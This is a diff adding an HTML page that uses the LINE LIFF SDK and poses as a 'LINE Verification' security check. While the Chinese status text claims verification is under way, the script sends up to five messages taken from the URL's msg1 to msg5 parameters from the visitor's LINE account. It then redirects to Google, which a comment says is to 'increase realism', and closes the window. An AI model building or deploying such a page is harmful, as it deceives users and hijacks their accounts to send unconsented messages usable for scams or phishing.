@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LINE Verification</title>
+    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <style>
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 3px solid #333; border-top: 3px solid #00B900; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <div id="status">正在進行安全驗證...</div>
+    </div>
+
+    <script>
+        async function main() {
+            // ⚠️ 記得替換成你自己的 LIFF ID
+            await liff.init({ liffId: "這裡填入你的LIFF_ID" });
+
+            if (!liff.isLoggedIn()) {
+                liff.login();
+                return;
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+            let messagesToSend = [];
+
+            // 讀取 msg1 ~ msg5 參數
+            for (let i = 1; i <= 5; i++) {
+                const msg = urlParams.get('msg' + i);
+                if (msg) messagesToSend.push({ type: 'text', text: msg });
+            }
+
+            if (messagesToSend.length > 0) {
+                try {
+                    await liff.sendMessages(messagesToSend);
+                    document.getElementById('status').innerText = "驗證完成，正在導向...";
+                    // 發送成功後，先跳轉到 Google 再關閉視窗，增加真實感
+                    window.location.href = "https://www.google.com";
+                    setTimeout(() => { liff.closeWindow(); }, 1000);
+                } catch (e) {
+                    liff.closeWindow();
+                }
+            } else {
+                document.getElementById('status').innerText = "無效的驗證請求";
+            }
+        }
+        main();
+    </script>
+</body>
+</html>
